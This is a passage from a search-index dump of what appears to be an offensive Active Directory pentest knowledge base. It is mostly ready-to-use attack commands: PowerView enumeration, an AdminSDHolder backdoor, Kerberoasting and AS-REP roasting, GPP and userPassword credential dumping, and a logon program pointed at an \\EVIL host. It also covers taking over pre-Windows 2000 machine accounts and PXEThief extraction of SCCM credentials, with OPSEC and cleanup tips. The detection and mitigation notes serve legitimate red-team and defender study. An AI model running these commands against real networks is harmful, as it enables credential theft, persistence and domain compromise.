Enumeration","text":"<p>Find users from foreign domains present in this domain: <pre><code>Get-DomainForeignUser\n</code></pre></p> <p>Find groups in target domain that have foreign members: <pre><code>Get-DomainForeignGroupMember -Domain target.domain.com\n</code></pre></p> <p>List foreignSecurityPrincipals from the GC (for SID/DN correlation): <pre><code>Get-DomainObject -Properties objectsid,distinguishedname -SearchBase \"GC://corp.local\" -LDAPFilter '(objectclass=foreignSecurityPrincipal)'\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#computer-enumeration","title":"Computer Enumeration","text":"<p>Inventory computers with helpful props: <pre><code>Get-DomainComputer -Properties name,dnshostname,operatingsystem,lastlogontimestamp\n</code></pre></p> <p>Filter by OS for servers: <pre><code>Get-DomainComputer -OperatingSystem \"*Server*\" -Properties name,operatingsystem\n</code></pre></p> <p>Computers allowing unconstrained delegation: <pre><code>Get-DomainComputer -Unconstrained\n</code></pre></p> <p>Computers trusted to authenticate for others (constrained delegation): <pre><code>Get-DomainComputer -TrustedToAuth\n</code></pre></p> <p>Computers with specific SPNs (e.g., SQL): <pre><code>Get-DomainComputer -SPN *SQL* -Properties name,serviceprincipalname\n</code></pre></p> <p>List computers from a specific OU: <pre><code>Get-DomainComputer -SearchBase \"LDAP://OU=Servers,DC=corp,DC=local\" -Properties dnshostname\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#session-and-local-group-enumeration","title":"Session and Local Group Enumeration","text":"<p>Enumerate SMB sessions on a remote host: <pre><code>Get-NetSession -ComputerName FS01.corp.local\n</code></pre></p> <p>Enumerate logged-on users on a host: <pre><code>Get-NetLoggedOn -ComputerName WS01.corp.local\n</code></pre></p> <p>Enumerate current RDP sessions (and source IPs): <pre><code>Get-NetRDPSession -ComputerName WS01.corp.local\n</code></pre></p> <p>List local groups on a host: <pre><code>Get-NetLocalGroup -ComputerName WS01\n</code></pre></p> <p>List members of a local group (default WinNT provider): <pre><code>Get-NetLocalGroupMember -ComputerName WS01 -GroupName \"Administrators\"\n</code></pre></p> <p>Faster local group member enumeration via Win32 API: <pre><code>Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local\n</code></pre></p> <p>Enumerate shares on a host: <pre><code>Get-NetShare -ComputerName SQL01\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#user-hunting","title":"User Hunting","text":"<p>Show all user locations across domain (be noisy): <pre><code>Find-DomainUserLocation -ShowAll\n</code></pre></p> <p>Focus on unconstrained delegation computers and show users: <pre><code>Find-DomainUserLocation -ComputerUnconstrained -ShowAll\n</code></pre></p> <p>Hunt for admin users who allow delegation on unconstrained hosts: <pre><code>Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation\n</code></pre></p> <p>Hunt specific user and check if you have local admin where found: <pre><code>Find-DomainUserLocation -UserIdentity \"jdoe\" -CheckAccess\n</code></pre></p> <p>Get logged-on users for all \"server\" OUs in a domain: <pre><code>Get-DomainOU -Identity *server* -Domain corp.local | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | % { Get-NetLoggedOn -ComputerName $_.dnshostname } }\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#share-and-file-enumeration","title":"Share and File Enumeration","text":"<p>Enumerate open shares domain-wide: <pre><code>Find-DomainShare\n</code></pre></p> <p>Enumerate only shares you can read: <pre><code>Find-DomainShare -CheckShareAccess\n</code></pre></p> <p>Search domain shares for interesting files (old Invoke-FileFinder): <pre><code>Find-InterestingDomainShareFile -Domain CORP\n</code></pre></p> <p>Same, with alternate credentials: <pre><code>$Password=\"PASSWORD\"|ConvertTo-SecureString -AsPlainText -Force; $Credential=New-Object System.Management.Automation.PSCredential(\"CORP\\user\",$Password); Find-InterestingDomainShareFile -Domain CORP -Credential $Credential\n</code></pre></p> <p>Recursively search a specific UNC path for keywords, Office docs, and last-access time: <pre><code>Find-InterestingFile -Path \\\\SERVER\\Share -Include password,creds,secret -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#gpo-enumeration","title":"GPO Enumeration","text":"<p>List all GPOs in the domain: <pre><code>Get-DomainGPO\n</code></pre></p> <p>List OUs and their GPO links: <pre><code>Get-DomainOU -GPLink | Select-Object Name,gplink\n</code></pre></p> <p>List policies applied to a specific computer: <pre><code>Get-DomainGPO -ComputerIdentity WS01.corp.local\n</code></pre></p> <p>Map where a user/group has local group rights via GPO (old Find-GPOLocation): <pre><code>Get-DomainGPOUserLocalGroupMapping -Identity \"CORP\\Helpdesk\"\n</code></pre></p> <p>Check RDP group mapping for a user in a domain: <pre><code>Get-DomainGPOUserLocalGroupMapping -Identity \"CORP\\user\" -Domain corp.local -LocalGroup RDP\n</code></pre></p> <p>Export a CSV of GPO mappings with flattened computer arrays: <pre><code>Get-DomainGPOUserLocalGroupMapping | % { $_.computers = ($_.computers -join \", \"); $_ } | Export-Csv -NoTypeInformation gpo_map.csv\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#delegation-enumeration","title":"Delegation Enumeration","text":"<p>Users with constrained delegation configured: <pre><code>Get-DomainUser -TrustedToAuth\n</code></pre></p> <p>Computers with constrained delegation configured: <pre><code>Get-DomainComputer -TrustedToAuth\n</code></pre></p> <p>Admin-protected users who are allowed to be delegated (interesting): <pre><code>Get-DomainUser -AllowDelegation -AdminCount\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#acl-enumeration-and-modification","title":"ACL Enumeration and Modification","text":"<p>Enumerate who has rights over a target object (resolve GUIDs): <pre><code>Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local\n</code></pre></p> <p>Grant \"will\" the right to reset \"matt\"'s password: <pre><code>Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose\n</code></pre></p> <p>Read AdminSDHolder permissions (resolve GUIDs): <pre><code>Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs\n</code></pre></p> <p>Backdoor AdminSDHolder to grant \"matt\" full rights to protected objects: <pre><code>Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All\n</code></pre></p> <p>Identify principals with replication (DCSync) or full control (domain DN path): <pre><code>Get-DomainObjectAcl \"dc=dev,dc=testlab,dc=local\" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }\n</code></pre></p> <p>Alternative DCSync check using Get-ObjectACL alias/function: <pre><code>Get-ObjectACL \"DC=testlab,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#group-policy-preferences-enumeration","title":"Group Policy Preferences Enumeration","text":"<p>Recover any stored Group Policy Preferences passwords (legacy): <pre><code>Get-GPPPassword\n</code></pre></p> <p>Resolve all computer DNS hostnames where a given GPP/GPO applies by GUID: <pre><code>Get-DomainOU -GPLink '&lt;GPP_GUID&gt;' | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname }\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#acl-analysis","title":"ACL Analysis","text":"<p>Find interesting domain ACLs (write/owner/DACL rights) and resolve GUIDs: <pre><code>Find-InterestingDomainAcl -ResolveGUIDs\n</code></pre></p> <p>Flag GPOs where \"user\" SIDs (&gt;1000) have modification/control rights: <pre><code>Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') }\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#organizational-unit-and-dns-enumeration","title":"Organizational Unit and DNS Enumeration","text":"<p>List organizational units: <pre><code>Get-DomainOU\n</code></pre></p> <p>Find likely file servers based on user home/profile/script paths: <pre><code>Get-DomainFileServer\n</code></pre></p> <p>Enumerate DNS records for a zone (if DNS partition accessible): <pre><code>Get-DomainDNSRecord -Zone corp.local\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#user-impersonation","title":"User Impersonation","text":"<p>Temporarily impersonate a different credential (runas /netonly-like): <pre><code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a',$SecPassword); Invoke-UserImpersonation -Credential $Cred\n</code></pre></p> <p>Revert impersonation back to self: <pre><code>Invoke-RevertToSelf\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#object-analysis-and-modification","title":"Object Analysis and Modification","text":"<p>Detect outlier properties across computer objects: <pre><code>Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier\n</code></pre></p> <p>Set arbitrary attributes on an AD object: <pre><code>Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\\\EVIL\\program.exe'} -Verbose\n</code></pre></p> <p>Take or set ownership of an AD object: <pre><code>Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#kerberoasting-and-as-rep-roasting","title":"Kerberoasting and AS-REP Roasting","text":"<p>Kerberoast using defaults (prints TGS hashes): <pre><code>Invoke-Kerberoast\n</code></pre></p> <p>Kerberoast a specific account, Hashcat format: <pre><code>Invoke-Kerberoast -Identity \"svc_sql\" -OutputFormat Hashcat\n</code></pre></p> <p>Kerberoast scoped to a specific OU/SearchBase: <pre><code>Invoke-Kerberoast -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\" -OutputFormat Hashcat\n</code></pre></p> <p>List AS-REP roastable users (no preauth): <pre><code>Get-DomainUser -PreauthNotRequired | Select-Object samaccountname\n</code></pre></p> <p>Request AS-REP roast for a specific user: <pre><code>Invoke-ASREPRoast -UserName jdoe -Verbose\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#local-admin-access-testing","title":"Local Admin Access Testing","text":"<p>Threaded probe to find where you're local admin (SMB/RPC): <pre><code>Find-LocalAdminAccess\n</code></pre></p> <p>Test admin access to a single host: <pre><code>Test-AdminAccess -ComputerName WS01\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#data-export-and-import","title":"Data Export and Import","text":"<p>Export objects to XML for offline analysis: <pre><code>Get-DomainUser | Export-Clixml .\\users.xml\n</code></pre></p> <p>Re-import exported PowerView objects: <pre><code>$Users = Import-Clixml .\\users.xml\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#special-queries","title":"Special Queries","text":"<p>Dump userPassword attribute (if present) and render ASCII: <pre><code>$FormatEnumerationLimit=-1; Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % { Add-Member -InputObject $_ NoteProperty 'Password' \"$([System.Text.Encoding]::ASCII.GetString($_.userPassword))\" -PassThru } | fl\n</code></pre></p> <p>Count total domain users quickly: <pre><code>(Get-DomainUser).Count\n</code></pre></p> <p>Find non-empty user description fields: <pre><code>Get-DomainUser -Properties samaccountname,description | ? { $_.description -ne $null }\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#process-enumeration","title":"Process Enumeration","text":"<p>PowerView 3.x has no Get-NetProcess; use native remoting/WMI/CIM:</p> <p>Get processes on a remote host via WinRM (PowerShell remoting): <pre><code>Invoke-Command -ComputerName WS01 -ScriptBlock { Get-Process } -Credential $Cred\n</code></pre></p> <p>Query processes via CIM (WSMan) on a remote host: <pre><code>Get-CimInstance Win32_Process -ComputerName WS01 -Credential $Cred\n</code></pre></p> <p>Query processes via legacy WMI (DCOM) on a remote host: <pre><code>Get-WmiObject Win32_Process -ComputerName WS01 -Credential $Cred\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/","title":"Pre windows 2000 computers","text":"<p>Tools: pre2k, nxc</p>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#technique","title":"Technique","text":"<p>Pre-Windows 2000 compatibility refers to a legacy configuration setting in Active Directory that can introduce security vulnerabilities. When enabled, this setting adds the \"Everyone\" security principal to the \"Authenticated Users\" group, potentially granting anonymous users more access than intended.</p> <p>Additionally, computer accounts that were created with Pre-Windows 2000 compatibility or that have never had their passwords reset may be vulnerable to authentication attacks. These accounts can typically be identified by their password last set date being 12/31/1600.</p> <p>This technique allows attackers to authenticate as these vulnerable computer accounts using their machine name as the password, providing an initial foothold in the domain without requiring valid user credentials.</p>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#prerequisites","title":"Prerequisites","text":"<ul> <li>Network access to a domain controller</li> <li>Knowledge of domain computer names (can be obtained through various enumeration techniques)</li> <li>No valid credentials are required for exploitation in most cases</li> </ul>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#identify","title":"Identify","text":"<p>With creds <pre><code>pre2k auth -u &lt;user&gt; -d &lt;DOMAIN&gt; -p &lt;pass&gt; -dc-ip &lt;dcip&gt; -ldaps -save\n</code></pre> or <pre><code>nxc ldap &lt;dc-ip&gt; -u 'user' -p 'pass' -M pre2k\n</code></pre></p> <p>Without creds <pre><code>pre2k unauth -d &lt;DOMAIN&gt; -dc-ip &lt;dcip&gt; -inputfile &lt;listofcomputers&gt; -save\n</code></pre></p> <p>[!NOTE] You can pass <code>-n</code> to check blank passwords as well</p> <p>[!NOTE] Without using the tool, you can check by identifying <code>pwdlastset: 12/31/1600 7:00:00PM</code></p> <p>[!NOTE] The only error that indicates an auth failure is <code>KDC_ERR_PREAUTH_FAILED</code> other errors do not mean you can't authenticate</p> <p>Validate</p> <p><pre><code>smbclient domain/machinename\\$:machinename@dc-ip\n</code></pre> Expected output: <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code></p>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#exploit","title":"Exploit","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#option-1-change-password","title":"Option 1: Change password","text":"<p>[!NOTE] This is semi-destructive, you're changing the machine password, may require the object be rejoined to the domain</p> <p>Change the account password: <pre><code>impacket-changpasswd.py domain/machinename\\$:machinename@dc-ip -newpass &lt;pass&gt;\n</code></pre> or <pre><code>nxc smb &lt;dcip&gt; -u machinename$ -p 'machinename' -M change-password -o NEWPASS=NewPassword\n</code></pre></p>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#option-2-use-kerberos-auth","title":"Option 2: Use kerberos auth","text":"<p>No need to change the password if you use kerberos auth!</p> <pre><code>nxc smb &lt;ip&gt; -u machinename$ -p machinename -k\n</code></pre> <p>Grab the tgt for use with other tools. <pre><code>nxc smb &lt;ip&gt; -u machinename$ -p machinename -k --generate-tgt ticket\n</code></pre></p>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#detection","title":"Detection","text":"<ul> <li>Monitor for authentication attempts using computer account names with the same password as the computer name</li> <li>Look for Event ID 4768 (Kerberos TGT Request) for computer accounts from unusual sources</li> <li>Monitor for changes to computer account passwords (Event ID 4742)</li> <li>Scan domain for computer accounts with old password last set dates (especially 12/31/1600)</li> </ul>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pre_windows_2000_computers/#mitigation","title":"Mitigation","text":"<ul> <li>Disable the \"Allow anonymous access to Active Directory\" or \"Pre-Windows 2000 Compatible Access\" group in the domain</li> <li>Regularly reset computer account passwords using standard domain maintenance procedures</li> <li>Implement strong account management policies</li> <li>Consider using a Privileged Access Management (PAM) solution to control access to sensitive accounts</li> <li>Use tools like AD-Control-Paths to identify and remediate insecure ACL configurations</li> </ul>","tags":["#type/technique","#tactic/TA0001","#technique/T1078","#stage/initial-access","#os/windows","#protocol/smb","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/","title":"Pxe boot attacks","text":"","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#technique","title":"Technique","text":"<p>This technique provides initial access by exploiting the Pre-Boot Execution Environment (PXE), a standard for booting computers over the network. In corporate environments, PXE is commonly used by System Center Configuration Manager (SCCM) to deploy operating systems.</p> <p>An attacker on the local network can masquerade as a new computer requesting a boot image. By capturing the SCCM boot media files, the attacker can perform an offline password cracking attack to decrypt them. A successful decryption reveals sensitive information, most notably the credentials for the Network Access Account (NAA) or domain join accounts, which can be used for initial access and privilege escalation within the Active Directory domain.</p> <p>[!NOTE] Note The presence of PXE is a common indicator that SCCM is being used as well, but not always</p>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#prerequisites","title":"Prerequisites","text":"<p>Access Level: An attacker needs to be on the same local network (broadcast domain) as the SCCM PXE-enabled Distribution Point. No prior domain credentials are required.</p> <p>System State:</p> <ul> <li>A PXE-enabled SCCM Distribution Point must be accessible on the network.</li> <li>The attacker's machine must be a Windows system to run the required tool, <code>PXEThief</code>.</li> <li>The attacker's machine must be seen as an \"Unknown Computer\" by SCCM.</li> <li>A <code>tftp</code> client is required to download boot files.</li> <li><code>hashcat</code> and a custom SCCM hashcat module are needed for password cracking.</li> </ul> <p>Information: The IP address of the SCCM Distribution Point (DP) is helpful, though it can sometimes be discovered.</p>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A successful attack grants the attacker highly valuable credentials. The Network Access Account and Domain Join Account often have permissions to read from most Active Directory objects and write to computer objects, providing a significant foothold for lateral movement and further exploitation.</p> <p>OPSEC</p> <ul> <li> <p>Initial PXE/DHCP requests are broadcast traffic and may not appear suspicious.</p> </li> <li> <p>The <code>tftp</code> file transfer is unencrypted and could be flagged by network monitoring.</p> </li> <li> <p>Subsequent authenticated requests to the SCCM Management Point (MP) originate from an attacker-controlled, unmanaged device, which could be an indicator of compromise if client origins are monitored.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#identify","title":"Identify","text":"<p>The primary method for identifying a vulnerable PXE server is to use the <code>PXEThief</code> tool. While it has a discovery option, directly targeting a known or suspected SCCM server IP address is more reliable. https://github.com/MWR-CyberSec/PXEThief</p> <p>[!ALERT] Alert Use this fork of PXETHeif, it fixes hash extraction &amp; decryption issues: https://github.com/blurbdust/PXEThief</p> <p>[!NOTE] Note  PXEThief  should only be used on windows due to the pywin32 dependency, it also works best with python 3.10 (Unless you're using the blurbdust fork)</p> <p>Attempt to autodiscover distribution point IP: <pre><code>python pxethief.py 1 \n</code></pre></p> <p>You already know the SCCM server ip (more reliable): <pre><code>python pxethief.py 2 &lt;DISTRIBUTION_POINT_IP&gt;\n</code></pre> A successful response will provide the file paths for the .boot.var and .boot.bcd files on the server's TFTP share.</p>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#execution","title":"Execution","text":"<p>Step 1: Request Boot Media Paths</p> <p>Use PXEThief to coerce the DP into providing the location of the encrypted boot media files.</p> <pre><code>python pxethief.py 2 &lt;IP&gt;\n</code></pre> <p>This will output the full paths to the <code>.boot.var</code> and <code>.boot.bcd</code> files.</p> <p>Step 2: Download the Encrypted Boot Variable File</p> <p>Use the <code>tftp</code> client to download the <code>.boot.var</code> file from the Distribution Point.</p> <pre><code>tftp -i &lt;DISTRIBUTION_POINT_IP&gt; GET \"\\\\SMSTemp\\\\&lt;...&gt;.boot.var\" \"&lt;...&gt;.boot.var\"\n</code></pre> <p>Try a blank password for a quick win.</p> <pre><code>python pxethief.py 3 '.\\\\&lt;...&gt;.boot.var' ''\n</code></pre> <p>Step 3: Extract the Hash for Cracking</p> <p>Use <code>PXEThief</code> with option 5 to process the downloaded <code>.boot.var</code> file and generate a crackable hash.</p> <pre><code>python pxethief.py 5 '.\\\\&lt;...&gt;.boot.var'\n</code></pre> <p>A specific hashcat module must be used to crack the hash. Here is how to install it:</p> <pre><code>cd hashcat_pxe/\ngit clone https://github.com/hashcat/hashcat.git\ngit clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module\ncp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/\ncp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850\\* hashcat/OpenCL/\ncd hashcat\ngit checkout -b v6.2.5 tags/v6.2.5 # change to 6.2.5\nmake\n</code></pre> <p>Then, the hash can be cracked with hashcat's module <code>19850</code> and a password wordlist:</p> <pre><code>hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Step 5: Decrypt Media and Extract Credentials</p> <p>Use <code>PXEThief</code> with option 3, providing the downloaded <code>.boot.var</code> file and the cracked password to decrypt the contents and automatically extract credentials.</p> <pre><code>python pxethief.py 3 '.\\\\&lt;...&gt;.boot.var' \"Password123!\"\n</code></pre> <p>The tool will parse the decrypted data and display any found usernames and passwords for accounts like the NAA.</p>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li> <p>Delete all downloaded artifacts from the attack machine, including the <code>.boot.var</code>, <code>.boot.bcd</code>, <code>variables.xml</code>, and the exported <code>.pfx</code> certificate file.</p> </li> <li> <p>Remove the client certificate imported by <code>PXEThief</code> from the Windows Certificate Store.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#detection","title":"Detection","text":"<ul> <li> <p>Network Monitoring: Monitor for unusual <code>tftp</code> traffic or a high volume of PXE boot requests from a single source.</p> </li> <li> <p>Log Analysis: Audit SCCM and domain controller logs for authentication events tied to the Network Access Account originating from unexpected or unmanaged IP addresses.</p> </li> <li> <p>Endpoint Monitoring: Look for the execution of <code>PXEThief.py</code> or <code>tftp.exe</code> on non-administrative workstations.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/pxe_boot_attacks/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Strong Passwords: Protect the PXE boot media with a strong, complex, and long password. This makes offline cracking significantly more difficult and time-consuming.</p> </li> <li> <p>Least Privilege: Strictly enforce the principle of least privilege for the Network Access Account and any domain join accounts. They should have the absolute minimum permissions required to function.</p> </li> <li> <p>Network Segmentation: Use VLANs and firewall rules to restrict which network segments can communicate with SCCM Distribution Points on required ports (e.g., DHCP, TFTP).</p> </li> <li> <p>Regular Audits: Regularly audit and rotate the credentials used for PXE boot and within Task Sequences.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/dhcp","#protocol/tftp"]},{"location":"Active%20Directory/flat/relay_attacks/","title":"Relay attacks","text":"","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#technique","title":"Technique","text":"<p>Relay attacks capture authentication attempts (usually NTLM hashes) and relay them to target machines for various types of access. Instead of cracking the hash, the attacker passes it directly to another system to authenticate as the victim user.</p> <p>This technique is particularly effective in Active Directory environments where: - SMB signing is disabled or \"not required\" (common in many networks) - The relayed credentials belong to an administrative user on the target machine</p>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Network access to the target environment</p> <p>System State:  - Target machines must have SMB signing disabled or not required - Relayed credentials must have administrative privileges on the target</p> <p>Information: Knowledge of potential target machines in the network</p>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful relay attacks can provide administrative access to systems without the need to crack passwords, enabling an attacker to move laterally through a network very efficiently.</p> <p>OPSEC</p> <ul> <li>Authentication attempts are logged on target systems</li> <li>Network traffic may be monitored for relay activity</li> <li>Failed relay attempts might trigger security alerts</li> 